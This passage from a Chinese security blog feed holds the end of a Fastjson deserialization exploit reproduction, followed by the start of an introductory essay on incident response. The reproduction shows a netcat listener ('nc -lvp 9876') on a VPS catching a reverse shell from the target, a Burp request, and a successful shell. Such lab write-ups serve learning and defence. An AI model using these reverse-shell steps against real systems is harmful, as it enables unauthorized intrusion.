class="literal">true</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Burpsuite具体配置如下：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210305133216.png"></p><p>在 VPS 中使用命令 <code>nc -lvp 9876</code> 来接收反弹的 shell，然后在 Burp 发送数据包，发送后能观察到 RMI 服务和 Web 服务都被靶机访问。（说明发送过程没问题，如果没有看到下面的结果，需要检查一下 IP 和端口设置）</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210305133353.png"></p><p>成功 GET shell<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210305134426.png"></p><p>整体流程图：</p><h1 id="0x06-漏洞分析"><a href="#0x06-漏洞分析" class="headerlink" title="0x06 漏洞分析"></a>0x06 漏洞分析</h1><p>我复现完整个流程后，其实是非常懵逼的，这些教程为什么写到这里就结束了，难道他们都会吗？我是太菜了吗？原理是什么？怎么都没讲清楚？</p><h2 id="1-Fastjson怎么使用？"><a href="#1-Fastjson怎么使用？" class="headerlink" title="1 Fastjson怎么使用？"></a>1 Fastjson怎么使用？</h2><h1 id="0x07-修复方式"><a href="#0x07-修复方式" class="headerlink" title="0x07 修复方式"></a>0x07 修复方式</h1><h1 id="0x08-坑"><a href="#0x08-坑" class="headerlink" title="0x08 坑"></a>0x08 坑</h1><ol><li></li><li>编译恶意代码时，需要 Java 8。</li></ol><p>参考教程：</p><ol><li><a href="https://choge.top/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">fastjson反序列化漏洞复现</a></li><li></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【网络安全系列】浅谈应急响应</title>
      <link href="d9a63af06d5a/"/>
      <url>d9a63af06d5a/</url>
      
        <content type="html"><![CDATA[<p>应急响应包含组织为了应对突发/重大信息安全事件的发生所做的准备，以及在事件发生后所采取的措施。，是信息安全从业者的常见工作之一。应急响应并非仅仅是在系统被黑之后做一系列的补救措施，而是需要在平时就进行被黑的准备和避免被黑。</p><p>各大厂商通常的做法就是成立应急响应中心 SRC（Security Response Center），来尽量避免被黑。</p><hr><h1 id="1-Why？"><a href="#1-Why？" class="headerlink" title="1 Why？"></a>1 Why？</h1><p><font color="red">问1:为什么需要应急响应流程？</font></p><p>需要了解为什么需要应急响应，那就需要从应急响应的目的入手：尽可能保证网站系统的安全。</p><p>如果网站厂商不具备网站基本的保护能力，即基本的入侵检测能力，平时检测不到入侵事件，有可能被入侵成功很久了却浑然不知，攻击者可能早就在达成目标后，清理痕迹悄然离去了，然后就被爆出新闻《xxx公司xx万个人隐私信息流入暗网售卖》，紧接着股票下跌，一系列指责……</p><p>（开发人员的重心都处